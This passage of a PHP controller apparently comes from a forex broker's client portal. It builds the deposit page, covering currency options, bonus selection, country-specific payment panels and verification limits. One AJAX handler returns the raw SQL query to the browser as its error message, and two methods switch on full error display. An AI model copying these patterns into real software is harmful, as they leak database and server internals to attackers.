            $mtas2 = $this->general_model->showssingle($table = 'mt_accounts_set', $id = 'user_id', $field = $user_id, $select = 'mt_currency_base');

            switch ($mtas2['mt_currency_base']) {
                case 'RUB':
                    $depositAmount = ['1000000', '500000', '300000', '100000', '50000', '30000', '10000 ', '5000', '3000', '1000', '500'];
                    $currency1 = '<i class="fa fa-rub" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-rub" aria-hidden="true"></i>';
                    break;
                case 'GBP':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '<i class="fa fa-gbp" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-gbp" aria-hidden="true"></i>';
                    break;
                case 'EUR':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '<i class="fa fa-eur" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-eur" aria-hidden="true"></i>';
                    $cur_eur = '<i class="fa fa-gbp" aria-hidden="true"></i>';
                    break;
                case 'MYR':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = 'RM';
                    $currency2 = 'RM';
                    break;
                case 'IDR':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = 'Rp';
                    $currency2 = 'Rp';
                    break;
                case 'THB':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '&#3647;';
                    $currency2 = '&#3647;';
                    break;
                case 'CNY':
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '<i class="fa fa-cny" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-cny" aria-hidden="true"></i>';
                    break;
                default:
                    $depositAmount = ['10000', '5000', '3000', '1000', '500', '250', '100', '50', '30', '20', '10'];
                    $currency1 = '<i class="fa fa-usd" aria-hidden="true"></i>';
                    $currency2 = '<i class="fa fa-usd" aria-hidden="true"></i>';
            }

            if ($mtas2['mt_currency_base'] == 'EUR') {
                $data['title'] = lang('ch_tip_eur_p');
                $amount_tip = '<a data-toggle="tooltip" data-placement="top" title="'.$data['title'].'"><i class="fa fa-exclamation-circle"></i></a>';
            } else {
                $data['title2'] = lang('ch_tip_usd_p');
                $amount_tip = '<a data-toggle="tooltip" data-placement="top" title="'.$data['title2'].'"><i class="fa fa-exclamation-circle"></i></a>';
            }

            $data['cur_eur'] = $cur_eur;
            $data['tip'] = $amount_tip;

            $data['depositAmount'] = $depositAmount;
            $data['currency'] = $currency1;
            $data['currency2'] = $currency2;
            $data['base_currency'] = $mtas2['mt_currency_base'];
            $data['title_page'] = lang('sb_li_2');
            $data['active_tab'] = 'finance';
            $data['active_sub_tab'] = 'deposit';
            $data['metadata_description'] = lang('dep_dsc');
            $data['metadata_keyword'] = lang('dep_kew');

            $nodepositbonus = $this->g_m->showssingle2('users', 'id', $user_id, 'nodepositbonus,created,createdforadvertising');
            $first_bonus_acquired = $this->deposit_model->getFirstPercentBonusAcquired($user_id);

            $data['loginType'] = $this->session->userdata('login_type');
            $ForMarStaAcc = FXPP::get_standardgroup_v2($_SESSION['account_number']);
            if ($ForMarStaAcc) {
                $data['IsStandardAccount'] = true;
            } else {
                $data['IsStandardAccount'] = false;
            }

            $data['isSupporter'] = false;
//                if ($account = $this->g_m->whereCondition('all_accounts', array('user_id' => $user_id))) {
            if ($account = $this->general_model->whereConditionQuery($user_id)) {
                $data['isSupporter'] = FXPP::isSupporterAccounts($account['account_number']);
            }

            $bonus_selection = 'hdb';
            if ($nodepositbonus['nodepositbonus'] == 1) {
                $bonus_selection = 'ndb';
            } else {
                if ($first_bonus_acquired) {
                    if ($first_bonus_acquired['fiftypercentbonus'] == 1) {
                        $bonus_selection = 'fpb';
                    } elseif ($first_bonus_acquired['twentypercentbonus'] == 1) {
                        $bonus_selection = 'twpb';
                    } elseif ($first_bonus_acquired['thirtypercentbonus'] == 1) {
                        $bonus_selection = 'tpb';
                    } elseif ($first_bonus_acquired['hundredpercentbonus'] == 1) {
                        $bonus_selection = 'hpb';
                    } elseif ($first_bonus_acquired['fiftypercentlimitedbonus'] == 1) {
                        $bonus_selection = 'hpb';
                    } elseif ($first_bonus_acquired['tenpercentbonus'] == 1) {
                        $bonus_selection = 'tenpb';
                    }
                }
            }

            /* FXPP-6333 */
            $isMicro = $this->account_model->isMicro($user_id);
            if ($isMicro) {
                $data['micro'] = 1;
            }
            /* FXPP-6333 */
            $data['isNewAccountType'] = FXPP::fmGroupType($account['account_number']);
            $data['login_type'] = $this->session->userdata('login_type');
            $data['bonus_selection'] = $bonus_selection;
            $data['modal_bonus_alert'] = $this->load->ext_view('modal', 'bonus_alert', $data['data'], true);
//            if(IPLoc::Office()){
            $data['acc_status'] = $this->general_model->showssingle($table = 'users', $id = 'id', $field = $this->session->userdata('user_id'), $select = 'accountstatus');
            $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id'));
            if ($data['count_status']) {
                $data['error_msg'] = 'You are allowed to deposit up to 2000 EUR or equivalent converted amount in other currency starting from registration date, '.
                    date('F d, Y', strtotime(str_replace('-', '', $data['count_status']['created']))).' until '.
                    date('F d, Y', strtotime(str_replace('-', '', $data['count_status']['count'])))
                    .'. ';
            }
            $data['total_balance'] = $this->getBalance($mtas2['mt_currency_base']);
            $data['cur_base'] = $mtas2['mt_currency_base'];
//            }
            $css = $this->template->Css();
            $this->template->title(lang('dep_tit'))
                ->append_metadata_css("
                        <link rel='stylesheet' href='".$css."/finance-style.css'>
                        <link rel='stylesheet' href='".$css."/finance-style-v2.css'>
                ")
                ->set_layout('internal/main')
                ->prepend_metadata('')
                ->build('deposits/deposit_finance', $data);
        } else {
            // redirect('signout');
            $_SESSION['redirect'] = $this->config->item('domain-my').$_SERVER['REQUEST_URI'];
            $lan = FXPP::html_url();
            if ($lan == 'en' || $lan == 'EN') {
                $lan = '';
            }
            redirect(''.$lan.'/client/signin');
        }
    }

    private function roundno($number, $dp)
    {
        return number_format((float) $number, $dp, '.', '');
    }

    public function getBalance($currency)
    {
        $this->load->model('account_model');
        $getAccountNumber = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
        $account_info = ['iLogin' => $getAccountNumber['account_number']];
        $webservice_config = ['server' => 'live_new'];
        $WebService = new WebService($webservice_config);
        $WebService->open_RequestAccountBalance($account_info);
        switch ($WebService->request_status) {
            case 'RET_OK':
                $data['balance'] = $this->roundno(floatval($WebService->get_result('Balance')), 2);
                break;
            default:
                $data['balance'] = $this->roundno(floatval(0), 2);
        }
        $conv_amount_usd = $this->get_convert_amount($currency, $data['balance']);
        $conv_amount = $this->get_convert_amount(trim($currency), $data['balance'], trim('EUR'));

        return $conv_amount;
    }

    public function limitedBonusValidation()
    {
        if (!$this->input->is_ajax_request()) {
            die('Not authorized!');
        }

        echo json_encode(FXPP::Deposit100BonusValidation($this->session->userdata('user_id'), $this->input->post('amount')));
    }

    public function bonusValidation()
    {
        if (!$this->input->is_ajax_request()) {
            die('Not authorized!');
        }

        $userId = $this->session->userdata('user_id');
        $wehreData = [
            'user_id' => $userId,
        ];
        $wehreDataOr = [
            'tenpercentbonus' => 1,
            'twentypercentbonus' => 1,
            'thirtypercentbonus' => 1,
            'fiftypercentbonus' => 1,
            'fiftypercentlimitedbonus' => 1,
            'hundredpercentbonus' => 1,
        ];
        $rtnData['ErrorMsg'] = '';
        $resultData = $this->general_model->getQueryStirngAll(0, 'deposit', '*', $wehreData, $wehreDataOr); //($table='users',$id='id', $field=$user_id,$select='login_type');
        if ($resultData) {
            $rtnData['ErrorMsg'] = $this->db->last_query(); // 'Bonuses cannot be mixed in one account. You can register a new account to get the other bonus.';
        }
        echo json_encode($rtnData);
    }

    public function deposit_finance_for_partners()
    {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        if (!$this->session->userdata('logged')) {
            redirect('signout'); // isolate checking of login session if not logged signout the visitor.
        }

        $_SESSION['redirect'] = null;

        $this->lang->load('depositwithdraw');
        $data['title_page'] = lang('sb_li_2');
        $data['active_tab'] = 'finance';
        $data['active_sub_tab'] = 'deposit';
        $data['metadata_description'] = lang('dep_dsc');
        $data['metadata_keyword'] = lang('dep_kew');

        $user_id = $this->session->userdata('user_id');
        $displayAlert = $this->general_model->whereConditionQuery('deposit', ['user_id' => $user_id, 'status' => 2, 'isDeposit' => 0], 'transaction_id, status');

        if (FXPP::fmGroupType($_SESSION['account_number']) == 'ForexMart Pro') {
            $data['modal_pro_alert'] = $this->load->ext_view('modal', 'depositpro_alert', $data['data'], true);
            $data['isDisplayed'] = $displayAlert;
        }

        //r1 c1234
        $pnl['panel_bank_wire_transfer'] = $this->load->view('deposit_widget/bank_wire_transfer', null, true);
        $pnl['panel_bank_transfer'] = $this->load->view('deposit_widget/banktransfer', null, true);
        $pnl['panel_visa_mastercard'] = $this->load->view('deposit_widget/visa-mastercard', null, true);
        $pnl['panel_skrill'] = $this->load->view('deposit_widget/skrill', null, true);
        $pnl['panel_neteller'] = $this->load->view('deposit_widget/neteller', null, true);

        //r2 c1234
        $pnl['panel_paxum'] = $this->load->view('deposit_widget/paxum', null, true);
        $pnl['panel_paypal'] = $this->load->view('deposit_widget/paypal', null, true);
        $pnl['panel_webmoney'] = $this->load->view('deposit_widget/webmoney', null, true);
        $pnl['panel_payco'] = $this->load->view('deposit_widget/payco', null, true);

        //r3 c1234

        $pnl['panel_qiwi'] = ''; //$this->load->view('deposit_widget/qiwi', null, true);
        $pnl['panel_megatransfer'] = $this->load->view('deposit_widget/megatransfer', null, true);
        $pnl['panel_bitcoin'] = $this->load->view('deposit_widget/bitcoin', null, true);
        $pnl['panel_yandexmoney'] = $this->load->view('deposit_widget/yandexmoney', null, true);

        //r4 c1234
        $pnl['panel_deposit_monetaru'] = ''; //$this->load->view('deposit_widget/deposit-monetaru', null, true);
        $pnl['panel_sofort'] = $this->load->view('deposit_widget/sofort', null, true);
        $pnl['panel_fasapay'] = $this->load->view('deposit_widget/fasapay', null, true);
        $data['show_deposit'] = '';
        //r1 c1 alternate
        $pnl['panel_indo'] = $this->load->view('deposit_widget/new-indo', null, true);
        $pnl['panel_malay'] = $this->load->view('deposit_widget/new-malay', null, true);
        //  $pnl['panel_inpay'] = $this->load->view('deposit_widget/inpay', null, true);
        $pnl['panel_chinaunionpay'] = $this->load->view('deposit_widget/chinaunionpay', null, true);
        $pnl['panel_local_malay'] = $this->load->view('deposit_widget/deposit_local_myr', null, true);

        $pnl['panel_local_idr'] = $this->load->view('deposit_widget/deposit_local_idr', null, true);
        $pnl['panel_alipay'] = $this->load->view('deposit_widget/alipay', null, true);
        $pnl['panel_thai'] = $this->load->view('deposit_widget/deposit_bank_thb', null, true);
        $pnl['panel_accentpay'] = $this->load->view('deposit_widget/deposit_accentpay', null, true);

        $data['show_deposit'] .= '<div class="row">';

        if (FXPP::isIndonesianCountry()) {
            $data['show_deposit'] .= $pnl['panel_local_idr'];
        }
        if ($this->session->userdata('account_number') == '58008538' || $this->session->userdata('account_number') == '58037565') {
            $data['show_deposit'] .= $pnl['panel_indo'];
        } elseif (FXPP::isMalaysianCountry()) {
            $data['show_deposit'] .= $pnl['panel_malay'];
        } elseif (IPLoc::for_th_only() || FXPP::isThailandCountry()) {
            $data['show_deposit'] .= $pnl['panel_thai'];
        } else {
            //  $data['show_deposit'] .= $pnl['panel_bank_wire_transfer'];
                     // $data['show_deposit'] .= $pnl['panel_accentpay'];
        }

        $data['show_deposit'] .= $pnl['panel_skrill'];
        $data['show_deposit'] .= $pnl['panel_neteller'];
        $data['show_deposit'] .= '</div>';

        $data['show_deposit'] .= '<div class="row">';
        // $data['show_deposit'] .= $pnl['panel_paxum'];
        $data['show_deposit'] .= $pnl['panel_payco'];
        $data['show_deposit'] .= $pnl['panel_bitcoin'];
        $data['show_deposit'] .= $pnl['panel_fasapay'];

        $data['show_deposit'] .= '</div>';
        $data['show_deposit'] .= '<div class="row">';
        $data['show_deposit'] .= $pnl['panel_chinaunionpay'];
        $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
        $data['show_deposit'] .= $pnl['panel_alipay'];
        $data['show_deposit'] .= '</div>';

        $data['show_modal'] = '';

        $data['login_type'] = $this->session->userdata('login_type');
        $nuser_id = $this->session->userdata('new_reg_id');
        $this->template->title(lang('dep_tit'))
            ->set_layout('internal/main')
            ->prepend_metadata('')
            ->build('deposits/deposit-old-design', $data);
    }

    public function deposit_finance_for_partners_old()
    {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        if (!$this->session->userdata('logged')) {
            redirect('signout'); // isolate checking of login session if not logged signout the visitor.
        }
//        if (!IPLoc::Office_and_Vpn_Trading()) {
//
//            redirect('signout');
//        }
        $this->lang->load('depositwithdraw');
        $data['title_page'] = lang('sb_li_2');
        $data['active_tab'] = 'finance';
        $data['active_sub_tab'] = 'deposit';
        $data['metadata_description'] = lang('dep_dsc');
        $data['metadata_keyword'] = lang('dep_kew');

        //r1 c1234
        $pnl['panel_bank_wire_transfer'] = $this->load->view('deposit_widget/bank_wire_transfer', null, true);
        $pnl['panel_bank_transfer'] = $this->load->view('deposit_widget/banktransfer', null, true);
        $pnl['panel_visa_mastercard'] = $this->load->view('deposit_widget/visa-mastercard', null, true);
        $pnl['panel_skrill'] = $this->load->view('deposit_widget/skrill', null, true);
        $pnl['panel_neteller'] = $this->load->view('deposit_widget/neteller', null, true);

        //r2 c1234
        $pnl['panel_paxum'] = $this->load->view('deposit_widget/paxum', null, true);
        $pnl['panel_paypal'] = $this->load->view('deposit_widget/paypal', null, true);
        $pnl['panel_webmoney'] = $this->load->view('deposit_widget/webmoney', null, true);
        $pnl['panel_payco'] = $this->load->view('deposit_widget/payco', null, true);

        //r3 c1234

        $pnl['panel_qiwi'] = ''; //$this->load->view('deposit_widget/qiwi', null, true);
        $pnl['panel_megatransfer'] = $this->load->view('deposit_widget/megatransfer', null, true);
        $pnl['panel_bitcoin'] = $this->load->view('deposit_widget/bitcoin', null, true);
        $pnl['panel_yandexmoney'] = $this->load->view('deposit_widget/yandexmoney', null, true);

        //r4 c1234
        $pnl['panel_deposit_monetaru'] = $this->load->view('deposit_widget/deposit-monetaru', null, true);
        $pnl['panel_sofort'] = $this->load->view('deposit_widget/sofort', null, true);
        $pnl['panel_fasapay'] = $this->load->view('deposit_widget/fasapay', null, true);
        $data['show_deposit'] = '';
        //r1 c1 alternate
        $pnl['panel_indo'] = $this->load->view('deposit_widget/new-indo', null, true);
        $pnl['panel_malay'] = $this->load->view('deposit_widget/new-malay', null, true);
        //  $pnl['panel_inpay'] = $this->load->view('deposit_widget/inpay', null, true);
        $pnl['panel_chinaunionpay'] = $this->load->view('deposit_widget/chinaunionpay', null, true);
        $pnl['panel_local_malay'] = $this->load->view('deposit_widget/deposit_local_myr', null, true);

        $pnl['panel_alipay'] = $this->load->view('deposit_widget/alipay', null, true);
        $pnl['panel_thai'] = $this->load->view('deposit_widget/deposit_bank_thb', null, true);

        if (IPLoc::for_id_only() || FXPP::isIndonesianCountry()) {
            // Indonesia
            //r1 c1 alternate

            $pnl['panel_indo'] = $this->load->view('deposit_widget/new-indo', null, true);
            if (FXPP::html_url() == 'de') {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_indo'];
                $data['show_deposit'] .= $pnl['panel_skrill'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= '</div>';
            } else {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_indo'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= $pnl['panel_skrill'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_alipay'];
                $data['show_deposit'] .= $pnl['panel_chinaunionpay'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= '</div>';
            }

            $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
            $data['show_modal'] = $pnl['panel_new_indo_modal'];
        } elseif (IPLoc::for_th_only() || FXPP::isThailandCountry()) {
            // Thailand

            if (FXPP::html_url() == 'de') {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_thai'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= $pnl['panel_skrill'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= '</div>';
            } else {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_thai'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= $pnl['panel_skrill'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_alipay'];
                $data['show_deposit'] .= $pnl['panel_chinaunionpay'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= '</div>';
            }
        } elseif (IPLoc::for_my_only() || FXPP::isMalaysianCountry()) {
            $pnl['panel_malay'] = $this->load->view('deposit_widget/new-malay', null, true);
            if (FXPP::html_url() == 'de') {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_malay'];
                $data['show_deposit'] .= $pnl['panel_local_malay'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_skrill'];
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                $data['show_deposit'] .= '</div>';
            } else {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_malay'];
                $data['show_deposit'] .= $pnl['panel_local_malay'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_skrill'];
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];

                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_bank_wire_transfer'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= '</div>';
            }

            $pnl['panel_new_malay_modal'] = $this->load->view('deposit_widget/new-malay-modal', null, true);
            $pnl['panel_new_indo_modal'] = $this->load->view('deposit_widget/new-indo-modal', null, true);
            $data['show_modal'] = $pnl['panel_new_malay_modal'];
        } elseif (FXPP::isAccountFromEUCountry()) {
            $data['show_deposit'] .= '<div class="row">';
            // $data['show_deposit'].=$pnl['panel_bank_transfer']; //FXPP-10066
            $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
            $data['show_deposit'] .= $pnl['panel_skrill'];
            $data['show_deposit'] .= $pnl['panel_neteller'];
            $data['show_deposit'] .= '</div>';

            $data['show_deposit'] .= '<div class="row">';
            //$data['show_deposit'] .= $pnl['panel_sofort'];
            $data['show_deposit'] .= '</div>';
        } else {
            if (FXPP::html_url() == 'de') {
                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];
                $data['show_deposit'] .= $pnl['panel_skrill'];
                $data['show_deposit'] .= $pnl['panel_neteller'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_paxum'];
                $data['show_deposit'] .= $pnl['panel_payco'];
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                $data['show_deposit'] .= '</div>';
            } else {
                if (!FXPP::isEUClient()) {
                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_bank_wire_transfer'];
                    $data['show_deposit'] .= $pnl['panel_skrill'];
                    $data['show_deposit'] .= $pnl['panel_neteller'];
                    $data['show_deposit'] .= '</div>';

                    $data['show_deposit'] .= '<div class="row">';
                    $data['show_deposit'] .= $pnl['panel_paxum'];
                    $data['show_deposit'] .= $pnl['panel_payco'];
                    $data['show_deposit'] .= $pnl['panel_deposit_monetaru'];
                    $data['show_deposit'] .= '</div>';
                }

                $data['show_deposit'] .= '<div class="row">';

                $data['show_deposit'] .= $pnl['panel_qiwi'];
                $data['show_deposit'] .= $pnl['panel_fasapay'];
                $data['show_deposit'] .= $pnl['panel_alipay'];
                $data['show_deposit'] .= '</div>';

                $data['show_deposit'] .= '<div class="row">';
                $data['show_deposit'] .= $pnl['panel_chinaunionpay'];
                $data['show_deposit'] .= $pnl['panel_visa_mastercard'];

                // $data['show_deposit'] .= $pnl['panel_bitcoin'];
                $data['show_deposit'] .= '</div>';
            }

            $data['show_modal'] = '';
        }

        $data['login_type'] = $this->session->userdata('login_type');
        $nuser_id = $this->session->userdata('new_reg_id');
        $this->template->title(lang('dep_tit'))
            ->set_layout('internal/main')
            ->prepend_metadata('')
            ->build('deposits/deposit-old-design', $data);
    }

    private function deposit_validation($user_id)
    {
//        if ($account_detail = $this->general_model->whereCondition('all_accounts', array('user_id' => $user_id))) {
        if ($account_detail = $this->general_model->whereConditionQuery($user_id)) {
            $data['count_status'] = $this->general_model->getCountVerifyStatus($user_id); //joy deposit unverified FXPP-7829
            if ($data['count_status']) {
                return false;
            }
            if ($account_detail['approved'] == 1) {
                if (!$this->account_model->incompleteRegistration($user_id)) {
                    return '<p>'.lang('dpst_msg20').'</p><a href="'.FXPP::loc_url('my-account/register').'">'.lang('dpst_msg20_a').'</a>';
                }
                if (FXPP::isSupporterAccounts($account_detail['account_number'])) {
                    return lang('dpst_msg2');
                }

                //Additional validation for Spanish Clients
//                $isSpanish = $this->spanishValidation($user_id); // remove FXPP-11121
//                if ($isSpanish['spanish_client']) {
//                    return $isSpanish['message'];
//                }
            } else {
                return lang('n_01');
            }
        } else {
            return 'Account number not found';
        }

        if ($_GET['status'] == 'cancelled') {
            return lang('dpst_msg33');
        }

        return false;
    }

    private function updated_deposit_validation($user_id, $payment_type = null)
    {
//        if ($account_detail = $this->general_model->whereCondition('all_accounts', array('user_id' => $user_id))) {
        if ($account_detail = $this->general_model->whereConditionQuery($user_id)) {
            if ($account_detail['approved'] == 1 || $account_detail['approved'] == 3) {
              /*  if ($this->session->userdata('login_type') != 1) {
                    if (!$this->account_model->incompleteRegistration($user_id)) { //employment details
                        return '<p>'.lang('dpst_msg20').'</p><a href="'.FXPP::loc_url('my-account/register').'">'.lang('dpst_msg20_a').'</a>';
                    }
               }*/

                if (FXPP::isSupporterAccounts($account_detail['account_number'])) {
                    return 'Deposit is not allowed in this supporter account. You can only make deposits to your other accounts that is not a supporter account';
                }

                //Additional validation for Spanish Clients
//                $isSpanish = $this->spanishValidation($user_id);
//                if ($isSpanish['spanish_client']) {
//                    return $isSpanish['message'];
//                }

                   /*
                        if ($row = $this->account_model->isPartnerAcVerified($user_id)) {
                            if ($row->type_of_partnership == 'cpa') {
                                if ($row->cpa_accountstatus == 0) {
                                    return 'Your Partner is not yet verified.';
                                }
                            } else {
                                if ($row->accountstatus == 0) {
                                    return 'Your Partner is not yet verified.';
                                }
                            }
                        }
                    */
            } else {
                //validation for unverified accounts
                // payoma payment
                // eu accounts

                if (FXPP::isEUGroup($account_detail['account_number']) || $payment_type == 'payoma') {
                    return lang('n_01').' Click '.'<a href="'.FXPP::my_url('profile/upload-documents').'">'.'here '.'</a>'.'to verify your account now.';
                } else {
                    // removed FXPP-9770
//                        $non_verified_user = $this->non_verified_deposit_validation($user_id);
//                        $invalid = $non_verified_user?$non_verified_user:false;
//                        return $invalid;F

                    return false;
                }
            }
        } else {
            return 'Account number not found';
        }

        if ($_GET['status'] == 'cancelled') {
            return lang('dpst_msg33');
        }

        return false;
    }

    private function deposit_validation1($user_id)
    {
//        if ($account_detail = $this->general_model->whereCondition('all_accounts', array('user_id' => $user_id))) {
        if ($account_detail = $this->general_model->whereConditionQuery($user_id)) {
            if ($account_detail['approved'] == 1) {
                if (!$this->account_model->incompleteRegistration($user_id)) {
                    return '<p>In order to enable deposit option, you need to complete your Employment details</p>
                            <a href="'.FXPP::loc_url('my-account/register').'"> Click here to enter your details </a>';
                }
                if (FXPP::isSupporterAccounts($account_detail['account_number'])) {
                    return 'Deposit is not allowed in this supporter account. You can only make deposits to your other accounts that is not a supporter account.';
                }
            } else {
//                if(IPLoc::Office()){
                $non_verified_user = $this->non_verified_deposit_validation_v2($user_id);
                $invalid = $non_verified_user ? $non_verified_user : false;

                return $invalid;
//                }else{
//                    $non_verified_user = $this->non_verified_deposit_validation($user_id);
//                    $invalid = $non_verified_user?$non_verified_user:false;
//                    return $invalid;
//                }
            }
        } else {
            return 'Account number not found';
        }

        if ($_GET['status'] == 'cancelled') {
            return 'Transaction has been cancelled.';
        }

        return false;
    }

    public function non_verified_deposit_validation($user_id)
    {
        /*FXPP-7829*/
        /*rule1: Deposit page is enabled for non-verified accounts in the span of 15 days upon registration*/
        /*rule2: To enable deposit page even after 15 days for non-verified, account should have a balance of exactly 2000 EUR or equivalent before 15 days exception of deposit rule for non-verified ends*/
        $data['mt'] = $this->general_model->showssingle($table = 'mt_accounts_set', $id = 'user_id', $field = $user_id, $select = '*');
        $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id'));
        $EUR_balance = $this->getBalance($data['mt']['mt_currency_base']);

        if ($data['mt']['mt_account_set_id'] == 4) { //micro //FXPP-9625 modified
            if ($data['count_status']) {
                return false;
            } elseif ($EUR_balance == 200000) { //cents
                return false;
            } else {
                return lang('dpst_msg21-micro').'<a href="'.FXPP::my_url('profile/upload-documents').'">here</a>.';
            }
        } else {
            if ($data['count_status']) {
                return false;
            } elseif ($EUR_balance == 2000) {
                return false;
            } else {
                return lang('dpst_msg21').'<a href="'.FXPP::my_url('profile/upload-documents').'">here</a>.';
            }
        }
    }

    public function non_verified_deposit_validation_v2($user_id)
    {
//        $user_id = 183408;
        /*FXPP-8524*/
        /*rule1: Deposit page is enabled for non-verified accounts until the maximum total deposit of 2000 EUR has been reached*/
        $data['mt'] = $this->general_model->showssingle($table = 'mt_accounts_set', $id = 'user_id', $field = $user_id, $select = 'mt_currency_base');
        $data['pt'] = $this->general_model->showssingle($table = 'partnership', $id = 'partner_id', $field = $user_id, $select = 'currency as mt_currency_base');
        $data['account'] = $data['mt'] ? $data['mt'] : $data['pt'];
        $depositData = $this->deposit_model->getAccountTotalDeposit($user_id);
        $sum_amount = 0;
        if ($depositData) {
            foreach ($depositData as $a) {
//                if($a['transaction_type']=='BITCOIN'){
//                    $sum_amount = floatval($sum_amount) + floatval($a['conv_amount']);
//                }else{
//                    $sum_amount = floatval($sum_amount) + floatval($a['amount']);
//                }

                $sum_amount = floatval($sum_amount) + floatval($a['amount']);
            }
        }
        $deposit_amount = floatval($sum_amount);
